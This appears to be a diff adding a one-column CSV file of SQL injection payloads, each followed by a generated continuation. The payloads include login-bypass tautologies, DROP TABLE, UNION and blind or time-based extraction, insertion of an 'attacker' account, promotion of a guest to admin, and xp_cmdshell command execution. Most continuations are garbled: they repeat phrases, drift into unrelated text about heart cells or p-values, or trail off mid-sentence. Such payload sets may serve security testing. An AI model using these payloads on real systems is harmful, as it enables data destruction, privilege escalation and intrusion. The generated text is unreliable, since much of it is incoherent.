@@ -1,0 +1,271 @@
+Payload
+"SELECT * FROM users WHERE username = 'admin' AND password = 'password';
+
+SELECT * FROM users WHERE username = 'admin' AND password = 'password';
+
+SELECT * FROM users WHERE username = 'admin' AND password = '"
+"SELECT * FROM users WHERE username = 'admin' AND password = 'password';
+INSERT INTO users (username, password)
+VALUES ('admin', 'admin');
+
+I need to find the row where username and password are both equal"
+"SELECT * FROM users WHERE username = 'admin' AND password = 'admin' GROUP BY username ORDER BY username ASC
+
+I am trying to get the list of users with the username and password, but I have a lot of variables that I don"
+"SELECT * FROM users WHERE username = 'admin' AND password = 'admin' AND age = '3' LIMIT 1;
+
+I have tried the following query:
+SELECT user FROM users WHERE username = 'admin' AND password = '"
+SELECT * FROM users WHERE username = 'admin' AND password = 'admin' AND email = 'admin' AND password = 'admin' AND email = 'admin' AND email = 'admin' AND email = 'admin' AND password = '
+"' OR 1=1; -- if you have more than 1
+
+3.  The list of columns in the list of columns in the list of columns in the list of columns in the list of columns in the list of columns in the list"
+"' OR 1=1; --no-query-parameter-query=1)
+                               "
+"' OR 1=1; -- this is the
+     *                                  "
+"' OR 1=1; -- and if the first or last character is \n (which is 0) then it is 1 (if it is 1 it is 0).
+
+The above example shows that the first or last character is the same"
+"' OR 1=1; -- No such item was found in the search results.
+
+* * *
+
+### 4.2.2.1. **Query Query**
+
+Query Query
+
+Query Query
+
+Query Query
+"
+"' OR 'x'='x'; DROP TABLE users; --->
+DROP TABLE users;
+
+CREATE TABLE users (
+  id int(10) NOT NULL AUTO_INCREMENT,
+  name varchar"
+"' OR 'x'='x'; DROP TABLE users; --->
+CREATE TABLE users (
+    id INTEGER,
+    name VARCHAR(255),
+    password VARCHAR("
+"' OR 'x'='x'; DROP TABLE users; ---> DROP TABLE user; DROP TABLE user;
+CREATE TABLE users (
+    user_id int(11) NOT NULL AUTO_INCREMENT"
+"' OR 'x'='x'; DROP TABLE users; --->
+CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, username_type TEXT, password_type TEXT, user_type TEXT"
+"' OR 'x'='x'; DROP TABLE users; --->
+CREATE TABLE users (
+    id int(11) NOT NULL AUTO_INCREMENT,
+    user_id int(11)"
+"SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- The user's table name is required to be a table name.
+
+The query above returns the table names of the"
+"SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- <br/>
+SELECT * FROM information_schema.tables WHERE table_schema='public' AND table"
+"SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- we want to include the users table from the index.  
+SELECT * FROM information_schema.tables"
+"SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- <br>
+SELECT * FROM information_schema.tables WHERE table_schema='public' AND table"
+"SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'; -- (1) If table_name is a string, then a ',' (2) is used for a string."
+"SELECT username, password FROM accounts WHERE account_id = 1 UNION SELECT null, null;
+                              "
+"SELECT username, password FROM accounts WHERE account_id = 1 UNION SELECT null, null;
+SELECT username, password FROM accounts WHERE username = username AND account_id = 1;
+
+A:
+
+You are using a WHERE clause to"
+"SELECT username, password FROM accounts WHERE account_id = 1 UNION SELECT null, null;
+
+SELECT username, password FROM accounts WHERE username = username AND password = password;
+
+SELECT username, password FROM accounts WHERE username = username AND password"
+"SELECT username, password FROM accounts WHERE account_id = 1 UNION SELECT null, null;
+
+SELECT username, password FROM accounts WHERE username LIKE '%password%' UNION SELECT null, null;
+
+SELECT username, password FROM accounts"
+"SELECT username, password FROM accounts WHERE account_id = 1 UNION SELECT null, null;
+
+SELECT * FROM accounts WHERE username = 'username';
+
+SELECT username FROM accounts WHERE username = 'username';
+
+SELECT username FROM accounts WHERE"
+"INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); -- Don't care about the password? (hint: use a password!)
+
+I'm not sure if this is the correct way to do it"
+"INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); --  
+                           "
+"INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); -- Don't forget that you must enter the password before you begin the query.
+
+A:
+
+The solution is to use a subquery,"
+"INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); --->
+INSERT INTO accounts (username, password) VALUES ('likes', 'likes'); --->
+INSERT INTO accounts (username"
+"INSERT INTO accounts (username, password) VALUES ('attacker', 'malicious'); -- (1) - The hacker has stolen the password. (2) - The hacker has stolen the password. (3) - The hacker has stolen"
+"UPDATE accounts SET role = 'admin' WHERE username = 'guest'; -- ""admin""
+
+You can also use the query
+SELECT role FROM role WHERE username = 'guest';
+
+A:
+
+You have to use the"
+"UPDATE accounts SET role = 'admin' WHERE username = 'guest'; --
+SELECT role, user_name, role_id FROM accounts WHERE username = 'guest';
+
+A:
+
+You need to make sure the roles column"
+"UPDATE accounts SET role = 'admin' WHERE username = 'guest'; --->'guest' 
+
+UPDATE user_name SET role = 'admin' WHERE username = 'guest'; --->'guest' 
+
+"
+"UPDATE accounts SET role = 'admin' WHERE username = 'guest'; --
+                                 "
+"UPDATE accounts SET role = 'admin' WHERE username = 'guest'; --  
+SELECT role FROM users WHERE username = 'guest'; --  
+FROM users; --  
+
+SELECT role FROM users WHERE username ="
+"'; EXEC xp_cmdshell('dir'); --output-path=%s -o %s
+
+I've also tried to use 'dir' instead of '%s' because I want to avoid a lot of other things in this"
+'; EXEC xp_cmdshell('dir'); --exec xp_cmdshell('dir'); --exec xp_cmdshell('dir'); --exec xp_cmdshell('dir'); --exec xp_cmdshell('dir'); --exec xp_
+'; EXEC xp_cmdshell('dir'); --no-pdb-file --pdb-file-file=path/to/dir --no-pdb-file-file=/path/to/dir --pdb-file
+"'; EXEC xp_cmdshell('dir'); --exec xp_cmdshell('cmdshell');
+
+EXEC xp_cmdshell('dir'); --exec xp_cmdshell('cmdshell');
+
+EXEC xp_cmdshell('"
+"'; EXEC xp_cmdshell('dir'); --no-exec-dir --no-exec-arguments --no-exec-arguments-exec
+                 "
+"SELECT password FROM users WHERE username = 'admin' AND LENGTH(password) > 8; -- this is the first time I'm getting a error
+                   "
+"SELECT password FROM users WHERE username = 'admin' AND LENGTH(password) > 8; -- the result is ""password""
+SELECT username, password FROM users WHERE username = 'admin';
+
+A:
+
+You can use a CASE"
+"SELECT password FROM users WHERE username = 'admin' AND LENGTH(password) > 8; -- [1]
+SELECT * FROM users WHERE username = 'admin';
+
+A:
+
+You can use this query in PostgreSQL:
+"
+"SELECT password FROM users WHERE username = 'admin' AND LENGTH(password) > 8; -- This is the full list
+SELECT * FROM users WHERE username = 'admin' AND LENGTH(password) > 5; -- This is the full"
+"SELECT password FROM users WHERE username = 'admin' AND LENGTH(password) > 8; -- (1 row)
+INSERT INTO users(username, password)
+SELECT password FROM users WHERE username = 'admin' AND LENGTH(password"
+"SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; -- you can get the password here
+                "
+"SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; -- [1]
+SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = ''"
+"SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; -- If you don't have a password, you can just check out a password with 'p' and 'p'"
+SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; -- or 'b'='b'; -- or 'c'='c'; -- or 'd'='d';
+"SELECT * FROM accounts WHERE email LIKE '%@example.com%' AND password = '' OR 'a'='a'; -- This is the email address to which the user's password is stored.
+
+A:
+
+The way you"
+"SELECT * FROM orders WHERE order_id = 1001 AND ascii(substring((SELECT database()),1,1)) > 96; -- In this case it's going to be 1001
+SELECT * FROM orders WHERE order_id"
+"SELECT * FROM orders WHERE order_id = 1001 AND ascii(substring((SELECT database()),1,1)) > 96; -- if not specified, then it will throw error
+         "
+"SELECT * FROM orders WHERE order_id = 1001 AND ascii(substring((SELECT database()),1,1)) > 96; -- *
+
+Here is the query I am trying to execute:
+SELECT * FROM orders WHERE"
+"SELECT * FROM orders WHERE order_id = 1001 AND ascii(substring((SELECT database()),1,1)) > 96; -- for performance reasons, this should be the same query
+SELECT * FROM orders WHERE order_id"
+"SELECT * FROM orders WHERE order_id = 1001 AND ascii(substring((SELECT database()),1,1)) > 96; -- 1001 --> <orders>
+
+A:
+
+Try this:
+SELECT * FROM"
+"' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- 10 rows
+SELECT * FROM dual;
+
+SELECT * FROM dual;
+
+SELECT * FROM dual;
+
+SELECT * FROM dual;
+"
+"' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- 1=1
+UNION SELECT 2,3 FROM dual WHERE '2' = '2'; -- 2=2
+UNION SELECT 3,"
+"' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- I'd rather use a join instead, but I'm not sure how to do it
+
+A:
+
+Use:
+SELECT 
+ "
+"' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- UNION SELECT 1,2,3 FROM dual WHERE '2' = '2'; -- UNION SELECT 1,2,3 FROM dual WHERE"
+"' UNION SELECT 1,2,3 FROM dual WHERE '1' = '1'; -- 1,2,3,4
+SELECT * FROM dual WHERE '1' = '1'; -- 1,2,3,4
+SELECT"
+"' AND SLEEP(5); --no sleep at all
+SELECT * FROM tbl
+WHERE 
+    tbl.d.id = (SELECT DATE_FORMAT(timestamp, '%Y-%m"
+"' AND SLEEP(5); -- No sleep.
+
+**Proteins of the Heart**
+
+**Mammals**
+
+**Mammals are a group of cells that make up the heart. They are the heart"
+"' AND SLEEP(5); --
+                                        "
+' AND SLEEP(5); -- A. *P* = 0.049; -- B. *P* = 0.048; -- C. *P* = 0.039; -- D. *P* =
+' AND SLEEP(5); --                                         
+"' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; -- to allow you to search the table more than once and to show the results
+
+You can also add a WHERE clause in your query. For"
+"' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; -- returns 1
+
+-- some rows in the table
+-- and some in the table with the same name
+--
+
+SELECT * FROM information"
+"' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; -- find out the table name
+select * from information_schema.tables;
+
+select * from information_schema.tables"
+"' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; -- this is the first time the table is displayed.
+
+A:
+
+You can get the table's name and create it with:
+"
+"' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; -- the table name and the data
+
+SELECT * FROM information_schema.tables WHERE (SELECT COUNT(*) FROM information_sche"
+"' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; -- Select a row from the database.
+
+SELECT * FROM `test_data` WHERE (SELECT 1) = 1 AND"
+"' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; -- I would like to be able to check the value of 2 and use that as a value for 2
+
+A:
+"
+"' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; --
+                        "
+' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; -- or when CASE WHEN (SELECT 1) = 0 THEN 1 ELSE (SELECT 2) END; -- or when CASE WHEN
+"' AND CASE WHEN (SELECT 1) = 1 THEN 1 ELSE (SELECT 1 UNION SELECT 2) END; -- if case is not used then use 1
+
+SELECT * FROM `db` WHERE case = 1;
+
+SELECT *"
